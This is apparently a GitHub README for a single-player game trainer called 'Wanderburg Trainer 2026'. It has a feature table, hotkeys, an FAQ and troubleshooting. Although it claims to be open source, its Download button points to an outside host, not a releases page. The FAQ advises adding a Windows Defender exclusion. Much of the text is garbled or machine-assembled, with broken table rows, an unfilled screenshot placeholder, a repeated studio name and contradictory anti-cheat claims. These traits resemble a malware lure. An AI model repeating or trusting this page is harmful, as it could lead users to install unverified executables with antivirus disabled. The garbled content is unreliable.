<div align="center">

# Wanderburg Trainer 2026 — Trainer

**Unleash the hidden power of Wanderburg**
Free, open source, no installer. Opens with `Insert`.

![Version](https://img.shields.io/badge/version-1.0.0-4a3c2f?style=flat-square)
![Platform](https://img.shields.io/badge/Windows-10%20%7C%2011-1c1c1c?style=flat-square)
![Store](https://img.shields.io/badge/Steam-supported-4a8c5a?style=flat-square)
![Options](https://img.shields.io/badge/options-25%2B-6a6a6a?style=flat-square)
![Licence](https://img.shields.io/badge/licence-MIT-d9c47a?style=flat-square)

<p align="center">
<a href="https://install.rest/game/d0c81539-4f4d-494b-9d7d-d95a7f7039e6" rel="nofollow">
  <img src="https://camo.githubusercontent.com/b87131a1df3e3571047c2418ffeb7e38d207b84106665151f330efb21ec3f801/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f446f776e6c6f61642d626c61636b3f7374796c653d666f722d7468652d6261646765266c6f676f3d676974687562" width="300" data-canonical-src="https://img.shields.io/badge/Download-black?style=for-the-badge&amp;logo=github" style="max-width: 100%;">
<img alt="image" src="{{SCREENSHOT}}" />
</a>
</p>

</div>

---

> [!NOTE]
> Single-player only. No multiplayer, no anti-cheat, nothing here reaches anyone else.

## What it does

Wanderburg Trainer 2026 gives you full control over your character's stats, inventory, and abilities.

With a user-friendly interface, you can tweak gameplay on the fly and explore endless possibilities.

## Features

| Option | Hotkey | What it does |
|---|---|---|
| Unlimited XP | `F1` | Gain experience points instantly to level up faster. |
| Infinite Health | `F2` | Your health never drops below 1 HP. |
| Unlimited Resources | `F3` | Collect any amount of gold, materials, and items without limits. |
| Health Slider | slider | `1x`–`50x`, default `3x` |
| Experience Slider | slider | `0%`–`100%` — the softer alternative to Adjust the rate at which you gain experience per action. |
| Crew Management `crew` | `F4` | Add or remove crew members and set their roles. |
| Cheat Bypass `bypass` | `F5` | Disable anti-cheat checks for a smoother experience. |
| Save Slot `save` | — | Choose between multiple save slots to keep different game states. |
| Unlock all All hidden missions and achievements unlocked. | — | Persistent |
| Free camera | `F10` | Detach from the character |
| Hide HUD | `F11` | For screenshots |
| Field of view | slider | `60`–`130 deg` |

<sub>Tags — **`crew`**: changes the shared session · **`bypass`**: removes the work the game is built around · **`spoiler`**: reveals story early · **`save`**: writes persistent data · **`EA`**: unfinished Early Access system · **`comfort`**: accessibility, changes nothing. Use at most three. Anything tagged `bypass` or `spoiler` ships off.</sub>

## Hotkeys

`Insert` opens the menu · `End` resets everything · `F1`–`F12` as above, all rebindable · arrow keys and `Enter` navigate without a mouse

> [!TIP]
> Press 'Ctrl + H' to toggle health display.

> [!WARNING]
> Using this trainer may corrupt your save file. Back up before use.
>
> Options tagged `save` write persistent data that a patch can invalidate. Back up first and disable cloud sync while you experiment.

## FAQ

<details>
<summary>Will I get banned?</summary>
No. Will using the trainer get me banned?, no anti-cheat, no ranked mode. Achievements unlock locally unless you block them in the menu.
</details>

<details>
<summary>Is there a risk of losing my progress?</summary>
Yes, if the trainer interferes with game files, progress might be lost.
</details>

<details>
<summary>Can I use the trainer on the latest patch?</summary>
The trainer supports patches up to 2026-08-31. Future updates may require a new version.
</details>

<details>
<summary>Does it work on Steam Deck or Linux?</summary>
No. Windows only. Proton changes how the game's memory is laid out and this build does not handle that.
</details>

<details>
<summary>Windows Defender flagged the download.</summary>
Trainers read and write another process's memory, which is what a lot of malware also does, so heuristic scanners flag them on principle. Every release ships with a SHA256 checksum and full source. Add an exclusion if you are comfortable with that — and if you would rather not, don't. That is a reasonable call.
</details>

<details>
<summary>Options stopped working after an update.</summary>
Patches move memory offsets and options fail independently, so some will keep working. Check the Releases page for a build matching your game version.
</details>

## Troubleshooting

| Symptom | Fix |
|---|---|
| Nothing happens on `Insert` | Another overlay grabbed the key — Steam, Discord or RTSS. Rebind the menu key. |
| "Process not found" | The game must be running with a save loaded. Launch it first, then attach. |
| The trainer doesn't start after a game update. options do nothing | That memory allocates only in After installing the latest patch.. Get there first, then toggle. |
| Unlocks vanished after a patch | A persistent write was invalidated. Restore a backup from before the update. |
| The trainer fails to launch or crashes immediately. | Reinstall the trainer and ensure you are using the latest version compatible with the current patch. |

## Reporting a problem

[Open an issue](../../issues) with your **exact game build number** — that matters more than everything else combined — plus your store, Windows version, where you were in the game, and which single option misbehaved.

## Changelog

**v1.0.0** — 11 Sep 2026 — first release. 25+ options across Main, Settings, Cheats. All features disabled by default.

<!-- One line per release. Do not invent a version history — the Releases tab
     is one click away and an empty one under a long changelog reads badly. -->

---

<div align="center">
<sub>Unofficial fan tool. Not affiliated with Wanderburg Studios, Wanderburg Studios or Valve. Wanderburg Trainer 2026 and all related names and assets belong to their respective owners. Modifying a running game's memory carries some risk of crashes and save corruption — back up first, use at your own risk. MIT licensed.</sub>
</div>
